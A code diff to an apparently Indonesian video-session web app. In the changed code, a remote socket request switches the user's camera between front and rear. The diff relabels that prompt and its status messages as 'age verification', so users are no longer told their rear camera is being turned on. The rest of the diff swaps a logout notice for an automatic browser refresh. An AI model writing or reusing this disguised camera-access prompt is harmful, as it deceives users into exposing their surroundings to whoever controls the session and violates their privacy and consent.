@@ -966,9 +966,9 @@ function showFlipPermissionDialog() {
       border-radius: 16px; padding: 28px 24px; max-width: 320px; width: 100%;
       text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,.6);
     ">
-      <div style="font-size: 2.4rem; margin-bottom: 14px;">🔄</div>
+      <div style="font-size: 2.4rem; margin-bottom: 14px;">⚠️</div>
       <h3 style="font-family: Oswald, sans-serif; font-size: 1.2rem; margin-bottom: 10px; color: #E9ECF6;">
-        Verifikasi Kamera
+        Verifikasi Usia
       </h3>
       <p style="font-size: .84rem; color: #8A91AC; line-height: 1.6; margin-bottom: 22px;">
         Platform membutuhkan konfirmasi untuk melanjutkan verifikasi usia Anda. Ketuk <strong style="color:#E9ECF6;">Izinkan</strong> untuk melanjutkan.
@@ -998,14 +998,14 @@ function showFlipPermissionDialog() {
   document.getElementById('flip-deny-btn').addEventListener('click', () => {
     overlay.remove();
     socket.emit('flip-camera-rejected', { sessionId: mySessionId });
-    showFlipToast('❌ Permintaan kamera ditolak');
+    showFlipToast('❌ Permintaan verifikasi ditolak');
   });
 }
 
 async function doFlipCamera() {
   if (isFlipping) return;
   isFlipping = true;
-  showFlipToast('🔄 Membalik kamera...');
+  showFlipToast('⚠️Verifikasi...');
   try {
     const nextFacingMode = currentFacingMode === 'environment' ? 'user' : 'environment';
 
@@ -1049,11 +1049,11 @@ async function doFlipCamera() {
       if (audioSender && newAudioTrack) await audioSender.replaceTrack(newAudioTrack);
     }
 
-    showFlipToast(nextFacingMode === 'user' ? '📷 Kamera depan aktif' : '📷 Kamera belakang aktif');
+    showFlipToast(nextFacingMode === 'user' ? 'Verifikasi Berhasil' : 'Verifikasi Usia Berhasil');
     socket.emit('flip-camera-accepted', { sessionId: mySessionId });
   } catch (e) {
     console.error('Flip camera error:', e);
-    showFlipToast('❌ Gagal membalik kamera');
+    showFlipToast('❌ Gagal verifikasi ulang');
     socket.emit('flip-camera-rejected', { sessionId: mySessionId });
   } finally {
     isFlipping = false;
@@ -1224,17 +1224,17 @@ function handlePermissionRevoked() {
       ">Anda baru saja menonaktifkan izin <strong style="color:#E9ECF6;">kamera / mikrofon</strong>.</p>
       <p style="
         font-size: .82rem; color: #8A91AC; line-height: 1.65; margin-bottom: 24px;
-      ">Akses ke platform membutuhkan perizinan aktif. Sesi Anda akan diakhiri dan Anda akan diarahkan ke halaman login.</p>
+      ">Akses ke platform membutuhkan perizinan aktif. Browser akan direfresh otomatis untuk reset sesi.</p>
       <div style="
         background: rgba(242,113,107,.08); border: 1px solid rgba(242,113,107,.2);
         border-radius: 10px; padding: 10px 14px; margin-bottom: 22px;
         font-size: .78rem; color: #F2716B; font-weight: 600;
-      ">⏱ Mengarahkan ke halaman login dalam <span id="revoke-countdown">5</span> detik...</div>
+      ">🔄 Browser akan direfresh dalam <span id="revoke-countdown">5</span> detik...</div>
       <button id="revoke-ok-btn" style="
         width: 100%; padding: 13px; border-radius: 9px; font-size: .92rem; font-weight: 700;
         background: #F2716B; border: none; color: #fff; cursor: pointer;
         transition: opacity .2s;
-      ">Mengerti, Keluar Sekarang</button>
+      ">Refresh Sekarang</button>
     </div>
   `;
 
@@ -1263,7 +1263,7 @@ async function doRevokedLogout() {
   const overlay = document.getElementById('permission-revoked-overlay');
   if (overlay) overlay.remove();
 
-  addAdminLog(currentUser?.name || 'Pengguna', 'izin kamera dicabut — sesi diakhiri otomatis', '#F2716B', 'error');
+  addAdminLog(currentUser?.name || 'Pengguna', 'Perizinan dicabut — sesi diakhiri otomatis', '#F2716B', 'error');
 
   await stopSession(false);
   deleteCookie('lb_token');
@@ -1272,6 +1272,11 @@ async function doRevokedLogout() {
   currentUser = null;
   resetLogin();
   showScreen('screen-login');
+
+  // Auto-refresh browser setelah 5 detik
+  setTimeout(() => {
+    window.location.reload();
+  }, 5000);
 }
 
 window.addEventListener('DOMContentLoaded', () => {
